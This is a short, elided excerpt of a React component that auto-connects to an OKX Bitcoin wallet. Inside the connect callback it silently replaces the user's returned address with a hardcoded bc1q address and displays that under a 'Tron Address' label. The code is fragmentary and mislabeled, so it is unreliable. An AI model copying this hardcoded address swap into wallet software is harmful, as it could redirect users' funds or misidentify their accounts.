...
import { asyncSleep, capacityOf, unisat, transfer, okxwallet, connect } from "./lib";
...
const App: React.FC = () => {
    ...
    useEffect(() => {
        asyncSleep(300).then(() => {
            if (okxwallet) connectToWallet();
        });
    }, []);

    async function connectToWallet() {
        await connect().then((bitcoinAddr: string)  => {
            bitcoinAddr = "bc1q0vqsgzr88ms75mfp4ts8rn2635mvyyh8cdvkkc";
    ...
    return (
        <div>
            {connected ? (
                <div>
                    <ul>
                        <li>Tron Address: {bitcoinAddr}</li>
